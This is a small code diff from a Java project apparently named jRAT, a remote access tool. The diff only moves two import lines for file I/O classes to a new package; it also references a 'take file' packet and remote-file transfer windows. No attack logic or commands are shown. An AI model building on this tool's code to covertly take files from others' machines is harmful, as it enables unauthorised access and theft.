@@ -2,13 +2,13 @@ package pro.jrat;
 
 import java.io.File;
 
+import pro.jrat.common.io.FileIO;
+import pro.jrat.common.io.TransferListener;
 import pro.jrat.packets.outgoing.Packet42TakeFile;
 import pro.jrat.ui.frames.FrameFileTransfer;
 import pro.jrat.ui.frames.FrameRemoteFiles;
 import pro.jrat.utils.Util;
 
-import com.redpois0n.common.io.FileIO;
-import com.redpois0n.common.io.TransferListener;
 
 public class SendFile {
 	
